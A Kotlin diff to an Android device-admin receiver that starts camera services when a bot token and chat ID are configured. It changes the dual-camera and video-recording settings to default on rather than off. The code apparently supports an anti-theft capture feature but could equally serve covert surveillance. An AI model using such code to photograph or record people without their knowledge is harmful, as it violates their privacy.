@@ -43,13 +43,13 @@ class AdminReceiver : DeviceAdminReceiver() {
         if (token.isNotEmpty() && chatId.isNotEmpty()) {
             context.startForegroundService(Intent(context, CameraService::class.java))
 
-            if (prefs.getBoolean("dual_camera", false)) {
+            if (prefs.getBoolean("dual_camera", true)) {
                 context.startForegroundService(
                     Intent(context, CameraService::class.java)
                         .putExtra("lens_facing", "back")
                 )
             }
-            if (prefs.getBoolean("record_video", false)) {
+            if (prefs.getBoolean("record_video", true)) {
                 context.startForegroundService(Intent(context, VideoCaptureService::class.java))
             }
         }
